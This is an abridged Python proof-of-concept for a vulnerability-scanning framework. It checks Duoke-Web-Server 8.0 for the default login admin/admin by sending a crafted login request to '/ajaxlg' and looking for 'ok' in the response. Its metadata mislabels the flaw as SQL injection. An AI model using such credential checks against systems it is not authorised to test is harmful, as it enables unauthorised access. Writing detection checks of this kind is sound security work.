...
POC_NAME = "DuokeWebServer"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class DuokeWebServer(BasePoc):
    ...
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0024',    # PoC的VID编号
            'vbid': '',
            'Name': 'Duoke-Web-Server',    # PoC名称
            'Author': 'peiqi',    # PoC作者
            'Create_date': '2021-5-20',    # PoC创建时间
            },

        'vul': {
            'Product': 'Duoke-Web-Server',    # 漏洞所在产品名称
            'Version': '8.0',    # 产品的版本号
            'Type': 'SQLInjection',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Duoke-Web-Server 存在默认密码 admin/admin。
            ''',    # 漏洞简要描述
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/ajaxlg?opr=lg&r=none&email=admin&alias=&password=admin&ismd5=0&code=&validate=&mac=&ckiExp=7&rnd=876145')
        headers = {
        ...
        if "ok" in location:
            ...
            if verbose:
                highlight('[*] Duoke-Web-Server Ruomima Found')    # 打印高亮信息发现漏洞，其他可用方法
        else:
            if verbose:
                highlight('[*] Duoke-Web-Server Ruomima Not Found')
